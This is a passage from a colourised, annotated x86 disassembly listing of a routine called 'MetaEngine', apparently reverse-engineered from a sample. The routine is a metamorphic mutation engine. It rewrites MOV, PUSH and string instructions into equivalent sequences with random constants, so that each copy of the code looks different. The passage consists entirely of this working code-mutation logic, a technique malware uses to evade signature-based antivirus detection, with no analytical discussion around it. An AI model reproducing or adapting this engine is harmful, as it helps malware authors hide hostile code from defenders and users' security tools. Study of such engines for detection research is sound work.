                <span style="COLOR: #c0c0c0">sub     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; al = -al
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeXorRegRandom8</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+318j
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11110000b</span>             <span style="COLOR: white">; Generate XOR (ModRM = 11 110 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">xor     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; xor the value with a random value
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isMovReg32Imm32</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+2E0j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+2E4j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; MOV r32, imm32?
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">MakeMovPush1</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C0h</span>                  <span style="COLOR: white">; check if it's between B8 - C0
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">MakeMovPush1</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Rnd7</span>                      <span style="COLOR: #c0c0c0">; returns random eax (0 to 7)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeAddRegRandom32</span>  <span style="COLOR: white">; mutate?
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">5</span>                     <span style="COLOR: white">; skip
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreBytes</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeAddRegRandom32</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+351j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+363j
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11b</span>                   <span style="COLOR: white">; make it between 1 - 3
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; if it's zero,
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeAddRegRandom32</span>  <span style="COLOR: white">; then try again
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; ah = random selection
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; store opcode
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomDword</span>            <span style="COLOR: #c0c0c0">; returns a random dword in EAX
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; ecx = random dword
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store random dword
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; al = ADC/ADD/AND/CMP/OR/SBB/SUB/XOR
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store operation
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi-</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; get original instruction opcode
</span>                <span style="COLOR: #c0c0c0">sub     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; get the register used
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; if random == 2, Generate SUB
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeSubRegRandom32</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; if random == 3, Generate XOR
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeXorRegRandom32</span>
                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; Generate ADD (ModRM = 11 000 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsd                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; subtract the random value
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeSubRegRandom32</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+37Aj
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11101000b</span>             <span style="COLOR: white">; Generate SUB (ModRM = 11 101 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsd                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; eax -= random
</span>                <span style="COLOR: #c0c0c0">mov     ecx</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; save eax
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">sub     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; eax = -eax
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeXorRegRandom32</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+37Ej
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11110000b</span>             <span style="COLOR: white">; Generate XOR (ModRM = 11 110 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsd                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">xor     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; xor the value with a random value
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMovPush1</span><span style="COLOR: #c0c0c0">:                                     </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+346j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+34Aj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">68h</span>                   <span style="COLOR: white">; PUSH imm32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeMovPush2</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; Generate MOV r32, imm32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">movsd                             </span><span style="COLOR: white">; write next 4 bytes
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; Generate PUSH r32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMovPush2</span><span style="COLOR: #c0c0c0">:                                     </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+3AFj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">6Ah</span>                   <span style="COLOR: white">; PUSH imm8?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeMOVSB</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; make MOV r32, imm32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; load byte (imm8)
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">InvertSign</span>
                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword (imm32)
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; make PUSH r32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMOVSB</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+3C2j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0A4h</span>                  <span style="COLOR: white">; MOVSB?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeMOVSD</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace A4 with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">83068A50h</span>            <span style="COLOR: white">; 50         push    eax
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 8A 06      mov     al, [esi]
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">78801C6h</span>             <span style="COLOR: white">; 83 C6 01   add     esi, 1
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 88 07      mov     [edi], al
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">5801C783h</span>            <span style="COLOR: white">; 83 C7 01   add     edi, 1
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 58         pop     eax
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeMOVSD</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+3DBj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0A5h</span>                  <span style="COLOR: white">; MOVSD?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeSTOSB</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace A5 with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">83068B50h</span>            <span style="COLOR: white">; 50         push    eax
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 8B 06      mov     eax, [esi]
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">78904C6h</span>             <span style="COLOR: white">; 83 C6 04   add     esi, 4
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 89 07      mov     [edi], eax
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">5804C783h</span>            <span style="COLOR: white">; 83 C7 04   add     edi, 4
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 58         pop     eax
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeSTOSB</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+3F9j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0AAh</span>                  <span style="COLOR: white">; STOSB?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeSTOSD</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace AA with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C7830788h</span>           <span style="COLOR: white">; 88 07      mov     [edi], al
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 83 C7 01   add     edi, 1
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeSTOSD</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+417j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ABh</span>                  <span style="COLOR: white">; STOSD?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeLODSB</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace AB with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C7830789h</span>           <span style="COLOR: white">; 88 07      mov     [edi], eax
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 83 C7 04   add     edi, 4
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeLODSB</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+42Cj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ACh</span>                  <span style="COLOR: white">; LODSB?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeLODSD</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace AC with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C683068Ah</span>           <span style="COLOR: white">; 8A 06      mov     al, [esi]
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 83 C6 01   add     esi, 1
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeLODSD</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+441j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ADh</span>                  <span style="COLOR: white">; LODSD?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeOpRm8Imm8</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace AD with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C683068Bh</span>           <span style="COLOR: white">; 8B 06      mov     eax, [esi]
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; 83 C6 04   add     esi, 4
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeOpRm8Imm8</span><span style="COLOR: #c0c0c0">:                                    </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+456j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">40h</span>                   <span style="COLOR: white">; opcode &lt; 40?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">MakeTestImm8</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; save last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                     <span style="COLOR: white">; OP AL, imm8?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeOpEaxImm32</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80h</span>                   <span style="COLOR: white">; Generate OP r/m8, imm8
</span>                                                  <span style="COLOR: white">; ADC/ADD/AND/CMP/OR/SBB/SUB/XOR
</span>                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; load the same instruction again
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; keep the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; copy imm8 byte
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeTestImm8</span><span style="COLOR: #c0c0c0">:                                     </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+46Bj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0A8h</span>                  <span style="COLOR: white">; TEST AL, imm8?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">MakeOpEaxImm32</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; incrase code pointer by 1
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F6h</span>                  <span style="COLOR: white">; Replace A8 with the following sequence:
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; F6 C0 xx   test    al, xx
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C0h</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; load and store immediate byte
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeOpEaxImm32</span><span style="COLOR: #c0c0c0">:                                   </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+475j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+48Cj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">40h</span>                   <span style="COLOR: white">; opcode &lt; 40?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">MakeTestEaxImm32</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; ah = opcode
</span>                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; save last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">5</span>                     <span style="COLOR: white">; OP EAX, imm32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isOp8Imm8</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">81h</span>                   <span style="COLOR: white">; Generate OP r/m32, imm32
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = current opcode
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; keep the [opcode] field
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM byte
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; increase code pointer
</span>                <span style="COLOR: #c0c0c0">movsd                             </span><span style="COLOR: white">; copy immediate dword
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeTestEaxImm32</span><span style="COLOR: #c0c0c0">:                                 </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+49Fj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0A9h</span>                  <span style="COLOR: white">; TEST EAX, imm32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isOp8Imm8</span>
                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                    <span style="COLOR: white">; Replace A8 with the following sequence:
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F7h</span>                  <span style="COLOR: white">; F6 0C DD CC BB AA   test  eax, AABBCCDDh
</span>                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C0h</span>
                <span style="COLOR: #c0c0c0">stosb
</span>                <span style="COLOR: #c0c0c0">movsd                             </span><span style="COLOR: white">; load and store immediate dword
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isOp8Imm8</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+4A9j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+4C0j
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111110b</span>             <span style="COLOR: white">; save all bits, but the 'w' bit
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80h</span>                   <span style="COLOR: white">; OP r/m8,imm8?
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">SaveOpcodeField</span>
                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C6h</span>                  <span style="COLOR: white">; MOV r/m8, imm8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">SaveMovImm8Opcode</span>
                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F6h</span>                  <span style="COLOR: white">; OP r/m8?
</span>                                                  <span style="COLOR: white">; (DIV/IDIV/IMUL/MUL/NEG/NOT/TEST)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">Change8bitTo32bit</span>
